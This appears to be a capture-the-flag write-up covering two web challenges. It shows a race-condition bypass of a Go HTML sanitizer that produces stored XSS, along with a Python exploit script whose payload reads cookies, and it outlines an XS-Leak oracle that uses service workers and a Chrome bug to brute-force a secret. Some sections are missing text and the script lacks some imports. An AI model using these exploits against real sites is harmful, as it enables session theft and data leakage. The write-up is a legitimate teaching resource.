So, all we need is a single XSS. The problem is that view/create operations sanitize our input:

```go
func sanitizer(msg string) (string, error) {
	if len(msg) > 128 {
		return "", fmt.Errorf("too long message")
	}

	if utf8.ValidString(msg) == false {
		return "", fmt.Errorf("invalid character")
	}

	sanitized := bluemonday.StrictPolicy().Sanitize(msg)

	// &lt;\w+
	sanitized = strings.ReplaceAll(sanitized, "&lt;", "<")
	sanitized = strings.ReplaceAll(sanitized, "&gt;", ">")
	var reHTML = regexp.MustCompile(`<(/)?\w+`)

	sanitized = reHTML.ReplaceAllString(sanitized, "")

	return sanitized, nil
}
```

While it's pretty easy to get a closing HTML tag:

```
❯ go run test.go "&lt&ltx/script>"            
After sanitization: "&lt;&lt;x/script&gt;"
After unescape: "<<x/script>"
After regex: "</script>"
```

Getting an opening HTML tag is not possible because of the regex `reHTML.ReplaceAllString(sanitized, "")`, as browsers expect a letter immediately after `<` to consider it a valid HTML tag, e.g. this `< script>` will be parsed as a text. I couldn't find any recent vulnerabilities, or quirks of bluemonday that could be useful, it seemed pretty secure. But take a look at this part of code:

```go
		f, err := os.OpenFile(filePath, os.O_WRONLY|os.O_TRUNC, 0644)
		if err != nil {
			http.Error(w, err.Error(), http.StatusInternalServerError)
			return
		}
		defer f.Close()

		if _, err := f.Write([]byte(sanitized)); err != nil {
			http.Error(w, err.Error(), http.StatusInternalServerError)
			return
		}
```

there is a race condition between `os.OpenFile` and `f.Write`, if they execute in this order:

1. [thread 1] `os.OpenFile(filePath, os.O_WRONLY|os.O_TRUNC, 0644)`
2. [thread 2] `os.OpenFile(filePath, os.O_WRONLY|os.O_TRUNC, 0644)`
3. [thread 1] `f.Write([]byte(sanitized))` - `Xscript>`
4. [thread 2] `f.Write([]byte(sanitized))` - `<`

thread 2 could overwrite the prefix of what has just been written by thread 1, which would result in `<script>`. 
I used a last-byte attack to make it more reliable on the remote instance:

```python

import socket
import ssl
import time
import sys

USE_TLS = (PORT==443)
SCHEME = 'https' if USE_TLS else 'http'

barrier = threading.Barrier(2, timeout=5)

def create_note(content):
  url = f'{SCHEME}://{HOST}:{PORT}/create'
  response = requests.post(url, data={'message': content}, allow_redirects=False)
  note_id = response.headers.get('Location').split('/')[-1]
  return note_id

def get_note_content(note_id):
  url = f'{SCHEME}://{HOST}:{PORT}/notes/{note_id}'
  response = requests.get(url)
  return response.text

note = create_note('test')

def check_success():
  global note
  content1 = get_note_content(note)
  print(content1)
  if "<script" in content1:
    time.sleep(0.3)
    content2 = get_note_content(note)
    return "<script" in content2
  return False

def raw_request(content):
  global note
  content = quote(content)
  request = f"""PUT /notes/{note} HTTP/1.1
Host: {HOST}:{PORT}
Connection: keep-alive
Content-Length: {len(content) + len('message=')}
Content-Type: application/x-www-form-urlencoded

message={content}
""".replace('\n', '\r\n')
  with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as raw:
    raw.connect((HOST, PORT))
    s = _ssl_ctx.wrap_socket(raw, server_hostname=HOST) if USE_TLS else raw

    s.sendall(request.encode())

    barrier.wait()
    s.send(b"\r\n")
    resp = b''
    while chunk := s.recv(4096):
        resp += chunk
        if b"\r\n\r\n" in chunk:
            break
          
    return resp

def race1():
  while True:
    resp = raw_request('&lt')
    if check_success():
      print("Success!")
      print(f'{SCHEME}://{HOST}:{PORT}/notes/{note}')
      return
  
def race2():
  xss_payload = 'Xscript>console.log(document.cookie)<&ltX/script>'
  while True:
    raw_request(xss_payload)


t1 = threading.Thread(target=race1)
t2 = threading.Thread(target=race2)

t1.start()
t2.start()

t1.join()
t2.join()
```

After running for a few minutes, it succeeded, and I was able to get the flag.

## Getting JS execution

Based on all of that, the high-level plan would be:

1. Add our domain to the proxy.
2. Point the bot to `proxy:3000` to execute arbitrary JS under its origin.
3. Fetch `/admin` with `credentials: 'include'` to get `API_KEY`.
4. Use the oracle in `api` to get the flag.

The problem with the 2nd point is that the CSP is set to:


which means only `<script src=...>` is allowed, and additionally proxy prevents loading `script`:


## Building an oracle

Since now we have a way to talk to `api`, last part of the task is to use the `/messages/search` oracle to get the flag. `api` explicitly disallows any preflight requests:

```python
@app.before_request
def guard():
    if request.method == "OPTIONS":
        return "", 405
```

which means we'll need to use some kind of XS-Leak. Notice `conditional=True` flag in:

```python
    return send_file(
        io.BytesIO(data),
        mimetype="application/json",
        conditional=True,
    )
```

it enables support for `Range` header, which means we could get `206 Partial Content` or `416 Range Not Satisfiable` based on the response size, which we can influence by `q` parameter. We can't read status code directly from opaque response, but there is a Chrome n-day that allows us to differentiate between 206 and 416 - <https://issues.chromium.org/issues/474435504>. It comes down to:

1. Add `<audio>` with `src = http://api:9090/messages/search?key=${apiKey}&q=flag_prefix`
2. Chrome sends request with `Range: 0-` header
3. Intercept the request using service worker, respond with some dummy data and `Content-Range: bytes 0-39/10000`
4. Chrome sends request with `Range: 40-`
5. Intercept the request with service worker, `fetch()` it and store the response
6. Fetch any other resource with `{ mode: "no-cors" }`
7. Intercept this request using service worker, return stored response
8. if stored response status code was 206(length > 40), fetch fails, which we can `catch {}`. If response code was 416(length <= 40), nothing happens, execution continues

Having such an oracle, we can bruteforce byte by byte until getting the flag.
One last twist was that Docker domains didn't work on the remote for some reason, so I had to replace them with localhost to make it work.
